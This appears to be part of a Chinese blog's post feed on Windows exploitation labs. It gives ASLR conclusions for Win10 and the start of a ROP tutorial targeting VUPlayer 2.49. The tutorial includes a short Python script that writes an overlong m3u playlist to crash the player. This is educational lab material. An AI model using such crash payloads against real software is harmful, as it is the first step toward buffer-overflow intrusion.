<h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><p>使用<code>Lord PE</code>查看开启<code>ASLR</code>与不开启<code>ASLR</code>程序节的区别，发现前者比后者多一个<code>.reloc</code>节，用于存储重定位信息。</p>
<p><img src="D:\Users\czx\NativeFiles\Desktop\blog\source\pic\ASLR-in-Windows\sections_aslr.png" alt="sections_aslr"></p>
<p><img src="D:\Users\czx\NativeFiles\Desktop\blog\source\pic\ASLR-in-Windows\section_noaslr.png" alt="section_noaslr"></p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><h3 id="ASLR与程序基址之间的关系"><a href="#ASLR与程序基址之间的关系" class="headerlink" title="ASLR与程序基址之间的关系"></a>ASLR与程序基址之间的关系</h3><p>Windows（至少Win10）下的<code>ASLR</code>机制，对程序基址的影响，只在系统启动时发挥作用，系统运行过程中，各个模块的基址不会变化。</p>
<p>（和我预想中不太一样，本来以为只有特定的dll是这样，但是上面可以看到一个普通的可执行程序<code>Exploitme</code>也是这样）。</p>
<h3 id="ASLR与堆栈基址之间的关系"><a href="#ASLR与堆栈基址之间的关系" class="headerlink" title="ASLR与堆栈基址之间的关系"></a>ASLR与堆栈基址之间的关系</h3><p>Windows（至少Win10）下，开启<code>ASLR</code>后，程序的堆栈基址每次运行时都是随机的。</p>
]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
  <entry>
    <title>Exploitme——ROP</title>
    <url>/2023/10/20/Exploitme2/</url>
    <content><![CDATA[<p>当程序开启数据执行保护（DEP）后，我们无法在栈上执行<code>shellcode</code>，但可以利用程序中自带的代码片段（gadget），使<code>ret</code>指令和栈数据相配合，将 <code>gadget</code>串成一串，也能起到<code>shellcode</code>的效果，这就是返回导向编程<code>ROP</code>。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.freebuf.com/articles/system/173654.html">Windows漏洞利用开发：返回导向编程(ROP)</a></li>
</ul>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
<li><p>Immunity Debugger : 一个windows下由纯python编写的调试器，有丰富的python安全工具库。</p>
<ul>
<li>下载链接：<a href="https://github.com/kbandla/ImmunityDebugger/releases">ImmunityDebugger</a></li>
</ul>
</li>
<li><p>mona插件：将mona.py放到Immunity Debugger 的PyCommands目录下即可</p>
<ul>
<li>下载链接：<a href="https://github.com/corelan/mona/raw/master/mona.py">mona.py</a></li>
</ul>
</li>
<li><p>VUPlayer ： 一个小巧的音乐播放器。</p>
<ul>
<li>下载链接：<a href="https://www.exploit-db.com/exploits/40018">VUPlayer 2.49</a></li>
</ul>
</li>
</ul>
<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>编写python脚本，生成一个 test.m3u</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="number">3000</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>打开VUPlayer，选择<code>file--&gt;open playlist</code>，选中<code>test.m3u</code>，发现<code>VUPlayer</code>闪退。</p>
]]></content>
      <categories>
        <category>Windows-PWN</category>
      </categories>
  </entry>
</search>
